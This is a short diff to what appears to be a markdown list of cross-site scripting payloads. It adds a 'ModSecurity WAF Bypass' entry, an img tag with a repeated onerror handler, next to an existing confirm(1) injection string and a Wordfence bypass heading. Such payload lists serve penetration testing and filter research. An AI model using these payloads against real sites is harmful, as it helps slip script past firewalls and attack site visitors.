@@ -13,6 +13,11 @@
 \');confirm(1);//
 ```
 
+**ModSecurity WAF Bypass**
+Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
+```html
+<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
+```
 
 **Wordfence XSS Bypasses**
 
